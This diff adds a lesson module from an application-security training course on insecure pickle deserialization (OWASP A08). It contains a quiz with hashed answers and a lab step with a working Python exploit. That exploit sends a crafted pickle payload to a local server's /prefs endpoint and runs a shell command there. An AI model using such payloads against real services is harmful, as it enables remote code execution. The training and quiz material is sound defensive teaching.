@@ -1,0 +1,54 @@
+{
+  "order": 10,
+  "id": "deser",
+  "title": "Insecure Deserialization",
+  "track": "OWASP Top 10",
+  "difficulty": "advanced",
+  "estimate": "18 min",
+  "brief": "**Ticket:** a preferences endpoint deserializes data from the client with pickle. Understand why that is remote code execution.",
+  "theory": "## Insecure deserialization (OWASP A08)\nDeserializing attacker bytes with `pickle.loads` runs their code \u2014 RCE. Same risk: unsafe `yaml.load`, Java serialization.\n\n**Fix:** never deserialize untrusted data with pickle/yaml; use JSON (data only).",
+  "worked_example": "```python\nclass E:\n    def __reduce__(self):            # runs during pickle.loads\n        return (os.system, ('id',))\n```\nSending `pickle.dumps(E())` to a pickle sink runs `id` on the server.",
+  "knowledge_check": [
+    {
+      "q": "Which Python call causes RCE on untrusted data?",
+      "type": "choice",
+      "choices": [
+        "json.loads",
+        "pickle.loads",
+        "str()",
+        "int()"
+      ],
+      "answer_sha256": "2eb5dd7db7a302507909fb4e1bd62c73616baba940f674f778946daaebd5c0f9"
+    },
+    {
+      "q": "The safe, data-only format is ___",
+      "type": "choice",
+      "choices": [
+        "pickle",
+        "yaml.load",
+        "JSON",
+        "marshal"
+      ],
+      "answer_sha256": "02bd175f329720378ce83dd56a1b6b1f5291a60182d6c54b5e0d1e8d248a267a"
+    }
+  ],
+  "investigation": {
+    "intro": "Run the deserialization exploit against the lab and watch code execute on the server.",
+    "steps": [
+      "```bash\ncd /workspaces/examto/appsec-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate 2>/dev/null; pip install -q -r requirements.txt\npython3 run_server.py               # leave this running\n```",
+      "In a second terminal, send a pickle payload that creates a file (proving RCE):\n```bash\npython3 - <<'EOF'\nimport base64,pickle,os,urllib.request\nm='/tmp/pwned_demo'; os.path.exists(m) and os.remove(m)\nclass E:\n    def __reduce__(self): return (os.system,(f'touch {m}',))\nurllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/prefs',data=base64.b64encode(pickle.dumps(E()))))\nprint('code executed on server:', os.path.exists(m))\nEOF\n```",
+      "It prints True \u2014 your payload ran a command on the server. The safe format you'd switch to is the answer below."
+    ],
+    "hints": [
+      "__reduce__ is what pickle runs.",
+      "The marker file appearing proves code execution.",
+      "The fix uses a data-only format."
+    ]
+  },
+  "capture": {
+    "task": "**What's the fix?** Name the safe, data-only format you should use instead of pickle.",
+    "hint": "data, not code",
+    "placeholder": "the safe format",
+    "answer_sha256": "02bd175f329720378ce83dd56a1b6b1f5291a60182d6c54b5e0d1e8d248a267a"
+  }
+}
